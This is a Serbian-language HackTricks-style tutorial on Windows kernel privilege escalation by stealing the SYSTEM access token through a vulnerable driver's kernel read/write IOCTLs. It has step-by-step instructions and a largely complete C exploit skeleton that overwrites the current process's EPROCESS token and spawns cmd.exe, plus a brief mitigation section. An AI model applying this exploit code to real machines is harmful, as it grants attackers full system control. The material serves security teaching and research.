# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Ako ranjivi driver izlaže IOCTL koji napadaču daje proizvoljne kernel read i/ili write primitivе, elevacija na NT AUTHORITY\SYSTEM se često može postići krađom SYSTEM access tokena. Tehnika kopira Token pokazivač iz SYSTEM procesa’ EPROCESS u trenutni proces’ EPROCESS.

Zašto radi:
- Svaki process ima EPROCESS strukturu koja sadrži (između ostalog) Token (zapravo EX_FAST_REF ka token objektu).
- SYSTEM proces (PID 4) drži token sa svim privilegijama uključenim.
- Zamena trenutnog process’ EPROCESS.Token sa SYSTEM token pokazivačem odmah čini da trenutni proces radi kao SYSTEM.

> Offsets u EPROCESS variraju između verzija Windowsa. Odredite ih dinamički (symbols) ili koristite constants specifične za verziju. Takođe zapamtite da je EPROCESS.Token EX_FAST_REF (donja 3 bita su flagovi za reference count).

## Koraci na visokom nivou

1) Pronađite ntoskrnl.exe base i rešite adresu PsInitialSystemProcess.
- Iz user mode-a, koristite NtQuerySystemInformation(SystemModuleInformation) ili EnumDeviceDrivers da dobijete učitane driver baze.
- Dodajte offset PsInitialSystemProcess (iz symbols/reversing) na kernel base da biste dobili njegovu adresu.
2) Pročitajte pokazivač na PsInitialSystemProcess → ovo je kernel pokazivač na SYSTEM-ov EPROCESS.
3) Iz SYSTEM EPROCESS-a, pročitajte UniqueProcessId i ActiveProcessLinks offset-e da biste prešli dvostruko povezanu listu EPROCESS struktura (ActiveProcessLinks.Flink/Blink) dok ne nađete EPROCESS čiji je UniqueProcessId jednak GetCurrentProcessId(). Sačuvajte oba:
- EPROCESS_SYSTEM (za SYSTEM)
- EPROCESS_SELF (za trenutni proces)
4) Pročitajte SYSTEM token vrednost: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Maskirajte donja 3 bita: Token_SYS_masked = Token_SYS & ~0xF (obično ~0xF ili ~0x7 u zavisnosti od build-a; na x64 donja 3 bita se koriste — 0xFFFFFFFFFFFFFFF8 maska).
5) Opcija A (uobičajeno): Sačuvajte donja 3 bita iz vašeg trenutnog tokena i spojite ih na SYSTEM-ov pokazivač da biste održali ugrađeni ref count konzistentnim.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Zapišite Token_NEW nazad u (EPROCESS_SELF + TokenOffset) koristeći vaš kernel write primitiv.
7) Vaš trenutni proces je sada SYSTEM. Po želji pokrenite novi cmd.exe ili powershell.exe da potvrdite.

## Pseudokod

Ispod je kostur koji koristi samo dva IOCTL-a iz ranjivog driver-a, jedan za 8-byte kernel read i jedan za 8-byte kernel write. Zamenite sa interfejsom vašeg drajvera.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Napomene:
- Offseti: Koristite WinDbg’s `dt nt!_EPROCESS` sa ciljanim PDB-ovima, ili runtime symbol loader-om, da biste dobili ispravne offset-e. Nemojte ih slepo hardkodovati.
- Maska: Na x64 token je EX_FAST_REF; najniža 3 bita su bita za referentni brojač. Zadržavanje originalnih niskih bitova iz vašeg tokena izbegava neposredne refcount neusaglašenosti.
- Stabilnost: Poželjno je elevirati trenutni proces; ako elevirate kratkotrajnog helper-a, možete izgubiti SYSTEM kada on izađe.

## Otkrivanje i ublažavanje
- Učitavanje unsigned ili nepouzdanih third‑party drajvera koji otkrivaju moćne IOCTLs je osnovni uzrok.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard i pravila Attack Surface Reduction mogu sprečiti učitavanje ranjivih drajvera.
- EDR može pratiti sumnjive IOCTL sekvence koje implementiraju arbitrary read/write i zamene tokena.

## References
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
